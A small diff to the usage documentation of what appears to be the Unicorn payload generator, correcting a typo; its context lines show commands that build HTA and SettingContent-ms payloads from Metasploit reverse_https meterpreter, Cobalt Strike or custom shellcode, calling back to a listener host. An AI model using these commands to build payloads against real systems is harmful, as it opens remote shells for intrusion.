@@ -459,7 +459,7 @@ The four methods below on usage:
 
 HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
 HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms
-HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms
+HTA Example SettingContent-ms: python unicorn.py <path_to_shellcode.txt>: shellcode ms
 Generate .SettingContent-ms: python unicorn.py ms
 
 The first is a Metasploit payload, the second a Cobalt Strike, the third your own shellcode, and the fourth
